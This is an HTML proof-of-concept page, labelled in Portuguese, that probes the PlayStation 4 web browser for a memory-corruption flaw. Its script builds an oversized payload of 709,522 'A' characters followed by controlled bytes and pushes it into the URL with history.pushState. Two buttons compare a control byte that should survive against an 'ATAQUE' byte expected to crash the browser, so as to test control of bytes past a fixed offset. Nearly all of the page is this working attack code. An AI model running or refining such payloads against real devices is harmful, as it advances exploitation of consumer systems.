<!DOCTYPE html>
<html>
<head>
    <title>PS4 Depth Charge Test</title>
    <style>
        body { background-color: #1a0505; color: #ff3333; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 25px; margin: 20px; cursor: pointer; 
            width: 90%; border: 2px solid #ff0000; background: #000; color: #fff; font-weight: bold;
        }
        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: yellow; }
    </style>
</head>
<body>

    <h1>Teste de Profundidade (709.524)</h1>
    <p>Usando 0x01 como chave para atacar o próximo byte.</p>

    <div id="log">Pronto.</div>

    <button style="border-color: #00ff00; color: #00ff00;" onclick="sendPayload(0x01)">
        1. BASE: 0x01 + 0x01 (Deve Sobreviver)<br>
        <small>Offset 523 e 524 com valor 1</small>
    </button>

    <button onclick="sendPayload(0x41)">
        2. ATAQUE: 0x01 + 'A' (Deve Travar)<br>
        <small>Offset 523=Seguro, Offset 524='A'</small>
    </button>

    <script>
        const OFFSET = 709522;

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function sendPayload(lastByte) {
            const hexVal = lastByte.toString(16).toUpperCase();
            log("Testando payload finalizando com 0x" + hexVal + "...");
            
            setTimeout(() => {
                try {
                    // 1. O Corpo Principal
                    let buffer = "A".repeat(OFFSET);
                    
                    // 2. O Porteiro (Byte 709.523) - Usamos 0x01 pois sabemos que não trava
                    buffer += "\x01"; 

                    // 3. O Alvo (Byte 709.524) - Aqui testamos se podemos escrever
                    buffer += String.fromCharCode(lastByte);

                    // Dispara
                    history.pushState({}, "depth_test", "/" + buffer);
                    
                    log("Resultado: SOBREVIVEU! O byte extra " + hexVal + " foi aceito ou ignorado.");

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>
